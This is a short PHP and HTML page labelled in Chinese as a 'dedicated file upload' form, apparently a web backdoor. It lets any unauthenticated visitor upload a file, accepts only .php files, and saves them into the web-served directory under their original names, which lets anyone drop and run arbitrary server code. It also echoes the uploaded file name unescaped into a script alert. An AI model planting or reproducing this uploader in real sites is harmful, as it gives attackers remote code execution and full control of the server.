<?php
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
header("Content-Type:text/html;charset=GB2312");
if(isset($_POST['abc']))
{
	$uploaddir='./';
	$uploadfile=$uploaddir.basename($_FILES['upfile']['name']);
//	if(file_exists($uploadfile))
//		unlink($uploadfile);

	if(array_pop(explode('.',basename($_FILES['upfile']['name'])))=='php')
	{
		if(move_uploaded_file($_FILES['upfile']['tmp_name'],$uploadfile))
		{
			echo '<script type="text/javascript">alert(\'文件',basename($_FILES['upfile']['name']),'上传成功!\');</script>';
		}
	}else
					echo '<script type="text/javascript">alert(\'本页面只允许上传php文件!\');</script>';
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>文件上传专用</title>
</head>
<BODY>
<form name="forml" method="POST" action="" enctype="multipart/form-data">
<div align="center">
  <center>
<table  width="420" height="300" width="90%" cellSpacing="1" cellPadding="0">
<tr>
	<td align="center" colspan="5"><br><span class="TitleColor"><font size=4>文件上传专用(上传后存于所在系统根目录)</span><br><br></td>
</tr>
<tr>
	<td colspan=5><br><font size=4>请选择本次上传文件:<input name="abc" value="0" type="hidden"><input name="upfile" type="file" size="42"></td>
</tr>
<tr>
	<td colspan=5 align=center><br><a href="javascript:sub()"><font size=4><b>确定上传</a>&nbsp;&nbsp;&nbsp;&nbsp;</td>
</tr>
</table>
</center>
</div>
</form>
</body>
</html>
<script type="text/javascript">
function openwindow(url,width1,height1,left1,top1)
{
	left1=(window.screen.availWidth-width1)/2;
	top1=(window.screen.availHeight-height1)/2;
	var Win = window.open(url,'','width='+width1+',height='+height1+',left='+left1+',top='+top1+',resizable=0,menubar=no,status=no');
}
function sub()
{
		window.forml.submit();
}
</script>
